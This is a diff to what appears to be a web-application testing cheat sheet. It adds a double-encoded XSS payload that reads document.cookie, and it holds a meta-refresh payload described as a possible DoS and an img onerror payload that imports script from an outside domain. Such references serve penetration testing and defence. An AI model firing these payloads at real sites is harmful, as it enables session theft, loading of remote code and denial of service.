@@ -1067,12 +1067,16 @@ Manually testing for XXE vulnerabilities generally involves
   - `onpointerrawupdate` (Chrome only)
   - `onmouseleave`
 - This could lead the page to refresh quickly and infinitely causing being blocked by a WAF and being a potential DoS
-  ```
+  ```HTML
   %22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
   ```
 - [[Reference](https://twitter.com/zseano/status/1599118059511631872)]
   ```HTML
   <img src=totallyfake onerror=import(‘//domain.com/‘);//
+  ```
+- Double encoding
+  ```HTML
+  %253c%252fscript%253e%253cscript%253ealert(document.cookie)%253c%252fscript%253e
   ```
 
 
